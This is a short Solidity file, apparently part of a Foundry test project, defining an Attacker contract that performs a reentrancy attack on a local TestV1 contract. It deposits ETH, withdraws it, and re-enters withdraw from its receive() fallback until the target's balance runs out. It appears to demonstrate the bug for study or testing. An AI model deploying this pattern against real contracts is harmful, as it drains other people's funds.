// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TestV1} from "../src/Counter.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    TestV1 private testv1;
    uint256 public attackAmount;
    
    constructor(TestV1 _testV1){
        testv1 = _testV1;
    }

    function attack() external payable {
        require(msg.value > 0, "must send eth");

        attackAmount = msg.value;
        testv1.deposit{value: msg.value}();
        testv1.withdraw(msg.value);

    }

    receive() external payable{
        if (address(testv1).balance >= attackAmount) {
            testv1.withdraw(attackAmount);
        }
    }
}

